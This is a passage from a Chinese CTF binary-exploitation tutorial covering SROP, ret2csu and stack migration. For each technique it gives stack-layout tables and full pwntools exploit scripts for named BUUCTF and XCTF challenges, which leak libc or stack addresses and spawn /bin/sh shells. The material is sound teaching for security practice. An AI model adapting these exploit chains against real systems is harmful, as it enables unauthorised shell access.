所以我更推荐把栈迁移到 .bss 段的写法：

```
# written by Sonnety
from pwn import *
context(os='linux', arch='amd64', log_level='debug')


# io = remote("node.buuoj.cn", 12345)
io = process("./ciscn_s_3")
elf = ELF("./ciscn_s_3")
bss_addr = elf.bss() + 0x500 

mov_rax_15_ret = 0x4004DA   # sigreturn
syscall_ret = 0x400517

def main():
    frame1 = SigreturnFrame()
    frame1.rax = constants.SYS_read
    frame1.rdi = 0
    frame1.rsi = bss_addr
    frame1.rdx = 0x400
    frame1.rsp = bss_addr
    frame1.rip = syscall_ret

    payload_1 = b'A' * 0x10 + p64(mov_rax_15_ret) + p64(syscall_ret) + bytes(frame1)
    io.send(payload_1)
    # 此时 rsp 指向我们设定的 bss 段    
    io.recv(0x30)   # 程序会执行原本的 sys_write 吐出 0x30 字节垃圾数据，无视它
    sleep(0.1)

    binsh_addr = bss_addr + 0x108
    
    frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = binsh_addr
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall_ret
    
    payload_2 = p64(mov_rax_15_ret) + p64(syscall_ret) + bytes(frame2)
    payload_2 = payload_2.ljust(0x108, b'\x00') + b'/bin/sh\x00'
    
    io.send(payload_2)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 2：360chunqiu2017_smallest

[BUU CTF 题目链接](https://buuoj.cn/challenges#360chunqiu2017_smallest)

※ hint：`read()`会返回读入字符的长度，而程序在调用 call 之后的返回值一般是保存在 rax 中的。

64位程序，只开启了NX保护，程序非常简单，纯纯毛坯房，没有 bss 段。

<img width="1087" height="197" alt="image" src="https://github.com/user-attachments/assets/387bd309-de16-4c44-bc64-2f026f7bdbd2" />

Phase 1：泄露栈地址

`payload_1 = p64(start) * 3`

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x0` | `start` | `<- ret` |
| `0x8` | `start` |  |
| `0x10` | `start` |  |

第一次读入结束，ret start 再读入，rsp 下移 8 位。

`payload_2 = '\xB3', rax=1 (sys.write)`

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x8` | `0x4000B3` | `<- ret` |
| `0x10` | `0x4000B0` |  |

第二次读入结束，ret 0x4000B3，rsp 下移 8 位，跳过了 `xor     rax, rax`，直到执行到 syscall：

`edx = 0x400, rsi = rsp, rdi = rax = 1`
syscall 执行 `sys.write(1, rsp, 0x400)`

此时输出的前 8 个字节是 0x10 处的 0x4000B0，第 9 到 16 个字节是 0x18 处的栈地址，记为 stack_addr.

Phase 2：第一次 SROP (准备栈迁移)

ret start再读入，rsp下移 8位。

`payload_3 = p64(start) + b'A'*8 + bytes(frame1)`

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x18` | `0x4000B0` | `<- ret` |
| `0x20` | `AAAAAAAA` |  |
| `0x28` | `frame1` |  |
| `.....` |  |  |

这里填 8 个 A 给 syscall 留位置，方便下一次输入 15 个字符，使 `rax = 15` 执行 sigreturn。

Phase 3：触发第一次 SROP

ret start再读入，rsp 下移 8 位指向 `0x20`。

`sigreturn = p64(syscall_ret) + b'\x00'*7`, `rax=15`, 触发 sigreturn.

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x20` | `syscall` | `<- rsp` |
| `0x28` | `frame1` |  |
| `.....` |  |  |

*(frame1 前 7 个字节被覆盖为 `\x00`，但不影响).*
```
	frame1 = SigreturnFrame()
    frame1.rax = constants.SYS_read
    frame1.rdi = 0
    frame1.rsi = stack_addr
    frame1.rdx = 0x400
    frame1.rsp = stack_addr
    frame1.rip = syscall_ret
```

Phase 4 & 5：在受控栈上构造第二次 SROP

触发 sigreturn 后，rsp 被改为 stack_addr，并执行 `read(0, stack_addr, 0x400)`

这样我们 binsh 所写的位置就已知并且可控了。

```
	frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = binsh_addr
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall_ret
```


`payload_4 = p64(start) + b'B'*8 + bytes(frame2)`

`payload_4 = payload_4.ljust(0x300, b'\x00') + b'/bin/sh\x00'`

`binsh = stack_addr + 0x300`

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `stack_addr` | `0x4000B0` |  |
| `stack_addr + 0x08` | `BBBBBBBB` |  |
| `stack_addr + 0x10` | `sigframe` |  |
| `.....` | `00000000` |  |
| `stack_addr + 0x300` | `/bin/sh` |  |


最后再 ret start 重新读入，rsp 向下移 8 位，`sigreturn = p64(syscall_ret) + b'\x00'*7` 执行 execve。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 27847
io = remote(host,port)
# io = process("./smallest")
start = 0x4000B0
syscall_ret = 0x4000BE


def main():
    payload_1 = p64(start)*3
    io.send(payload_1)
    sleep(0.1)
    
    payload_2 = b'\xB3'         # 跳过 rax xor rax,并使 rax = 1
    # 执行 mov rdi,rax 后 ,rdi = 1(stdout)
    io.send(payload_2)
    # 执行 syscall，变成 sys_write(1,rsp,0x400)
    leak_data = io.recv(0x400)
    stack_addr = u64(leak_data[8:16]) # 前八个字节是我们填入的 start
    stack_addr = stack_addr - 0x2000        # 内存过高，防止越界，向下放一点
    print(hex(stack_addr))
    frame1 = SigreturnFrame()
    frame1.rax = constants.SYS_read
    frame1.rdi = 0
    frame1.rsi = stack_addr
    frame1.rdx = 0x400
    frame1.rsp = stack_addr
    frame1.rip = syscall_ret

    payload_3 = p64(start) + b'A'*8 + bytes(frame1)
    io.send(payload_3)
    sleep(0.1)

    sigreturn = p64(syscall_ret) + b'\x00'*7
    io.send(sigreturn)
    sleep(0.1)

    binsh = stack_addr + 0x300
    frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = binsh
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall_ret

    payload_4 = p64(start) + b'B'*8 + bytes(frame2)
    payload_4 = payload_4.ljust(0x300,b'\x00') + b'/bin/sh\x00'
    io.send(payload_4)
    sleep(0.1)
    io.send(sigreturn)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 题单

没有区分特点的题单，零基础可以做做。

我 SROP 的题也没见多少，haha。

BUU CTF：

[ciscn_2019_es_7](https://buuoj.cn/challenges#ciscn_2019_es_7)

[rootersctf_2019_srop](https://buuoj.cn/challenges#rootersctf_2019_srop)（※ hint：有 leave，所以第一次 SROP 要设置一个安全的栈底）

---

## Ret2csu

大号的 ROP 链。

在很多没有 puts 或者 printf，只有 read 和 write 可以利用的程序中，我们必须控制 rdi，rsi，rdx（或 ebx，ecx，edx）三个寄存器，往往 `pop rdi;ret` 和 `pop rsi,r15;ret` 是平凡的，但是 `pop rdx;ret` 未必会有。

Ret2csu 通常用来解决这个问题。

### 实现原理

在大多数动态链接的程序中，往往存在一个名为 `__libc_csu_init` 的片段，形似：

<img width="1214" height="424" alt="image" src="https://github.com/user-attachments/assets/03d52d23-7f30-456c-84fb-d9d7d5e999f4" />

其在 IDA 中也不一定就在 Function name 栏里，**我们可以通过 ROPgadget 搜索 `pop r15,ret` 来寻找它。**

为了方便这里称上面的片段叫 csu_mov，下面的叫 csu_pop。

通过跳转到 csu_pop 我们可以控制大量的寄存器，然后 ret 跳转到 csu_mov，按照一一对应的可以控制：

* `r13 ← rdx`
* `rsi ← r14`
* `edi ← r15d`
* `call ← r12+rbx*8` **（执行 r12+rbx*8 地址指向的地址，如 `r12 = write_got,rbx = 0` 会执行 write，但是写 write 的真实地址就不执行）**

因为 `add rbx,1`，我们为了方便初始使 `rbx = 0,rbp = 1`，那么这里 rbx = rbp，`cmp     rbx, rbp` 使 ZF = 1，jnz 不跳转。

然后顺序执行第二次 csu_pop，这里随便垫掉 pop，触发 ret。

#### 例题 1：[LCTF2016]pwn100

[攻防世界 题目链接](https://adworld.xctf.org.cn/challenges/list)

※ hint：平凡的 ret2libc，硬练 ret2csu。

自己搜一下 pwn-100.

其实这个题本身是非常平凡的 ret2libc，因为它同时有 `pop rdi;ret` 和 `puts`。

但是我被 gemini 骗了。它说这道题是 ret2csu 的经典题目。

总之来都来了。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "61.147.171.105"
port = 60199
io = remote(host,port)
# io = process("./pwn100")
elf = ELF("./pwn100")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']
main_addr = 0x4006B8
csu_pop = 0x40075A
csu_mov = 0x400740
pop_rdi_ret = 0x400763

def main():
    # payload_1 = b'A'*0x48 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    payload_1 = b'A'*0x48 + p64(csu_pop)
    payload_1 += p64(0)   # rbx
    payload_1 += p64(1)   # rbp
    payload_1 += p64(puts_got)    # r12+rbx*8 → call
    payload_1 += p64(0)           # r13 → rdx
    payload_1 += p64(0)           # r14 → rsi
    payload_1 += p64(puts_got)    # r15 → edi
    payload_1 += p64(csu_mov)
    payload_1 += b'B'*0x38 + p64(main_addr)
    payload_1 = payload_1.ljust(200,b'\x00')
    io.send(payload_1)
    io.recvline()
    leak_data = io.recvline().strip(b'\n').ljust(8,b'\x00')
    # print("\n[*] DEBUG : Leak data = ",leak_data)
    puts_addr = u64(leak_data)
    print("\n[+] Leak puts address :",hex(puts_addr))
    libc_base = puts_addr - 0x06f690
    print("\n[+] Leak libc base address :",hex(libc_base))
    system = libc_base + 0x045390
    print("\n[+] Leak system address :",hex(system))
    binsh = libc_base + 0x18cd57
    print("\n[+] Leak /bin/sh address :",hex(binsh))
    payload_2 = b'A'*0x48 + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
    payload_2 = payload_2.ljust(200,b'\x00')
    io.send(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 2：ciscn_2019_s_3

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)

※ hint：rdi = binsh，rsi = 0，rdx = 0

这道题本身是我们 SROP 的练手题，但是也是可以练 ret2csu 的。

因为 execve("/bin/sh",0,0) 要控制 rdi = binsh，rsi = 0，rdx = 0，后面两个寄存器可以用 ret2csu 控制。

因为输出长度是 0x30，可以泄露栈地址，那么我们就可以算出自己填的 binsh 地址。

<img width="1509" height="401" alt="image" src="https://github.com/user-attachments/assets/3e87a064-a248-45b4-b221-b84287f8b837" />

泄露栈到 rbp 是 0x9d8 - 0x8a0 = 0x138，加上 0x10 的 padding 就是 0x148。

那么 ret2csu 控制各个寄存器即可。

注意 ret2csu 的 call 是不能留空的，这里最好的方案是把 `mov rax 15;ret` 填到栈上，然后 call 它在栈上的地址。

```
# written by Sonnety
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

io = process("./ciscn_s_3")
elf = ELF("./ciscn_s_3")
csu_pop = 0x40059A
csu_mov = 0x400580
main_addr = elf.sym['main']
pop_rdi_ret = 0x4005a3
mov_rax_execve_ret = 0x4004E2
syscall = 0x400501

def main():
    payload_1 = b'A'*0x18 + p64(main_addr)
    # gdb.attach(io,"b 0x400519\nc")
    # pause()
    io.send(payload_1)
    io.recvn(0x20)
    leak_data = io.recvn(8)
    leak_stack = u64(leak_data)
    print("\n [+] Leak stack address :",hex(leak_stack))
    binsh = leak_stack - 0x148
    print("\n [+] Leak /bin/sh address :",hex(binsh))
    payload_2 = b"/bin/sh\x00" + b'B'*0x10 + p64(csu_pop)
    payload_2 += p64(0)       # rbx
    payload_2 += p64(1)       # rbp
    payload_2 += p64(binsh + 0x58)       # r12 → call
    payload_2 += p64(0)       # r13 → rdx
    payload_2 += p64(0)       # r14 → rsi
    payload_2 += p64(0)       # r15 → edi
    payload_2 += p64(csu_mov)
    payload_2 += p64(mov_rax_execve_ret)
    payload_2 += b'C'*0x38 + p64(pop_rdi_ret) + p64(binsh) + p64(syscall)
    io.send(payload_2)
    io.interactive()
    

if __name__ == "__main__":
    main()
```

---

## 栈迁移

> 可以回看复习“全局数据区域”。

在常规的栈溢出攻击中，通常会在覆盖了 ret 之后，继续写入长长的一串 ROP 链。

但是当程序只给非常微小的溢出空间时，比如，输入缓冲区的溢出限制非常严格，只能刚好覆盖掉 ebp 和紧挨着的 ret。

栈迁移正是为了解决这个问题而诞生的。

既然当前的栈空间不够，那我们就把栈顶指针（ESP/RSP）挪到另一个我们能控制、且空间足够大的内存区域（如 bss 段），去那里执行 ROP 链。

### 实现原理

`leave;ret` 等效于 

```
mov rsp,rbp;
pop rbp;
pop rip;
jmp rip
```

这里细化一下具体栈销毁流程。

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x0` | `padding` |  |
| `0x8` | `padding` |  |
| `0x10` | `padding` |  |
| `0x18` | `old rbp` | 父函数rbp |
| `0x20` | `rip address` | 函数调用结束后的下一条指令 |

执行流要执行 leave 时，rsp 从原本的 0x0 位置跳到了 0x18 这个位置来，而中间的 padding 则被视为销毁。

紧接着 pop rbp 则弹出了 old rbp 赋值给 rbp，恢复了父函数的 rbp，rsp 下移 8 位。

下一步等效于 pop rip 把函数调用后的下一条指令弹出给了 rip，最后函数返回父函数，子函数被销毁，最后状态恢复成了进子函数时的状态。

对于栈迁移：

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x0` | `padding` |  |
| `0x8` | `padding` |  |
| `0x10` | `padding` |  |
| `0x18` | `.bss address` | 伪造的栈地址 |
| `0x20` | `下一个 leave;ret` |  |

执行流执行 leave 时，销毁 padding，rbp 迁移到 bss 段上。

执行流执行 ret 时，跳到下一个 `leave;ret` 上。

此时，rsp 指向 0x28，rbp 指向 bss 段指定位置。

下一个 leave，将 rbp 赋值给 rsp，**此时 rsp 也被强制迁移到了伪造的栈地址上**。

假设我们在这个伪造的栈地址上已经放好了一些东西。

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x80` | `无用数据` | 头部，最初rbp迁移到这里 |
| `0x88` | `pop rdi;ret` |  |
| `0x90` | `/bin/sh\x00` |  |
| `0x98` | `system` |  |

那么 pop rbp 会把头部的无用数据弹出给 rbp，**很可能这样的数据是无意义的甚至是一个不可读写的非法地址**，不过不用管。

接着就是正常的 rop 链了。

#### 例题 1：ciscn_2019_es_2

※ hint：两个 printf 可以泄露栈地址。

这道题给了两个 printf，可以泄露栈。

<img width="2559" height="937" alt="image" src="https://github.com/user-attachments/assets/55c7a5dd-d58b-41e7-8f9a-06804323718c" />

溢出给了 8 个字节，刚好够覆盖 ebp 和 eip。

所以第一次 printf 肯定是泄露栈，然后 gdb 调试一下，找一下泄露的栈到输入的 ebp 的偏移。

<img width="1746" height="851" alt="900f5a51aa2e6d0e8e2ad953bd8cfc25" src="https://github.com/user-attachments/assets/33758e9d-9426-4889-a52d-e5ce6997442f" />

偏移是 0x38。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 29114
io = remote(host,port)
# io = process('./ciscn_2019_es_2')
elf = ELF('./ciscn_2019_es_2')
system = elf.plt['system']
leave_ret = 0x8048562
payload_1 = b'A'*0x24 + b"meow"

def main():
    io.recvuntil(b"Welcome, my friend. What's your name?\n")
    io.send(payload_1)
    io.recvuntil(b"meow")
    leak_data = io.recvn(4)
    leak_ebp = u32(leak_data)
    print("Leaked EBP:", hex(leak_ebp))     # Leaked EBP: 0xffe14708
    # gdb.attach(io)                        # 0xffe146d0
    ebp = leak_ebp - 0x38
    binsh = ebp + 0x10
    payload_2 = b'A'*4 + p32(system) + p32(0) + p32(binsh) + b"/bin/sh\x00"
    payload_2 = payload_2.ljust(0x28,b"\x00")
    payload_2 = payload_2 + p32(ebp) + p32(leave_ret)
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 2：[Black Watch 入群题]PWN

[BUU CTF 题目链接](https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN)

※ hint：似乎有个全局变量。

发现这个题有一个全局变量 s 可以写入，它写在 bss 段上，没有开 PIE，地址固定。

<img width="2550" height="1002" alt="image" src="https://github.com/user-attachments/assets/210723ec-2a78-41e5-97c3-ea535c87461f" />

于是我们可以考虑把 ROP 链写在 s 上，然而发现并没有 system。

所以考虑第一次栈迁移，泄露 write 以 ret2libc，然后返回 main 函数，第二次栈迁移 getshell。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 26018
io = remote(host,port)
# io = process("./spwn")
elf = ELF("./spwn")
libc = ELF("./libc-2.23.so")
main_addr = 0x8048513
bss = 0x804A300
write_plt = elf.plt['write']
write_got = elf.got['write']
vuln = 0x804849B
leave_ret = 0x8048511

def main():
    io.recvuntil(b"Hello good Ctfer!\n")
    io.recvuntil(b"What is your name?")
    payload_1 = b"meow" + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x400)
    io.send(payload_1)
    io.recvuntil(b"What do you want to say?")
    go_bss = b'A'*0x18 + p32(bss) + p32(leave_ret)
    io.send(go_bss)
    leak_data = io.recvn(4)
    write_addr = u32(leak_data)
    print(hex(write_addr))      # 0xf7e8fb50
    io.recvuntil(b"Hello good Ctfer!\n")
    io.recvuntil(b"What is your name?")
    libc_base = write_addr - libc.sym['write']
    system = libc_base + libc.sym['system']
    binsh = bss + 0x10
    payload_2 = b"meow" + p32(system) + p32(0) + p32(binsh) + b"/bin/sh\x00"
    io.send(payload_2)
    # gdb.attach(io)
    io.recvuntil(b"What do you want to say?")
    io.send(go_bss)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 3：gyctf_2020_borrowstack

[BUU CTF 题目链接](https://buuoj.cn/challenges#gyctf_2020_borrowstack)

※ hint：或许可以试试 one_gadget ?

最初我认为她很普通。

总之看起来和上一道题差不多，只不过上一道题是先输入到 bss 段，然后再触发栈溢出。

这道题是先栈溢出，然后再输入到 bss 段，不过这一点其实没什么差别，栈溢出与栈偏移不是输入就即刻发生的，而是遇到 ret 之后再发生的。

然而看她的 bss 段，`.bss:0000000000601080 ??                                bank db    ? ;` 其实离上面的 got 表一类不可写数据挺近的，考虑到栈向低地址生长，执行 system 或 puts 时会申请大量局部变量，可能跑到 got 上，所以我们必须先垫几个 ret 把 bss 抬高。

```
payload2 = p64(ret_addr)*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)         # ret 等效于 pop rip，将 rsp 抬高，放置访问到 got 表等不可写信息
```

然后我就 ROP 了半天，死活也不能打通 system，最后找了找题解，发现可以用 onegadget 就过了，怀疑是因为 system 会开非常多的局部变量，如果在 bss 段再次进行一次 ROP，那么 rsp 就会跑到 got 上去，导致错误。

但是如果我们在 main 函数进行 onegadget，虽然 main 函数只有 8 的溢出空间，不能 ROP，但是 main 在真实栈上，有几 MB 的深度，所以可以执行。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

# io = process("./gyctf_2020_borrowstack")
io = remote('node5.buuoj.cn', 26496)
elf = ELF("./gyctf_2020_borrowstack")
libc = ELF("./libc.so")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
leave_ret = 0x400699
bank_addr = 0x601080
pop_rdi_ret = 0x400703
ret_addr = 0x400704
main_addr = 0x400626

def main():
    io.recvuntil(b"want\n")
    
    payload_1 = b'a' * 0x60 + p64(bank_addr) + p64(leave_ret)
    io.send(payload_1)
    io.recvuntil(b"Done!You can check and use your borrow stack now!\n")

    payload2 = p64(ret_addr)*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)         # ret 等效于 pop rip，将 rsp 抬高，放置访问到 got 表等不可写信息
    io.send(payload2)
    leak_data = io.recvline().strip(b'\n')
    puts_addr = u64(leak_data.ljust(8,b'\x00'))
    print("\n[+] Leak puts:",hex(puts_addr))
    libc_base = puts_addr - libc.sym['puts']
    one_gadget_offset = 0x4526a 
    one_gadget = libc_base + one_gadget_offset
    print("\n[+] Libc Base:", hex(libc_base))
    print("\n[+] One Gadget:", hex(one_gadget))
    
    io.recvuntil(b"want\n")
    payload3 = b'a' * 0x60 + p64(0) + p64(one_gadget)
    io.send(payload3)
    io.recvuntil(b"Done!You can check and use your borrow stack now!\n")
    io.send(b'1') # 随便塞个字符让 read 返回，从而让 main 函数走到结尾触发 shell   
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 题单

没有区分特点的题单，零基础可以做做。

这次大概是我真菜，没做几个栈迁移的题目，佬别 D，人会补。

BUU CTF:

[actf_2019_babystack](https://buuoj.cn/challenges#actf_2019_babystack)
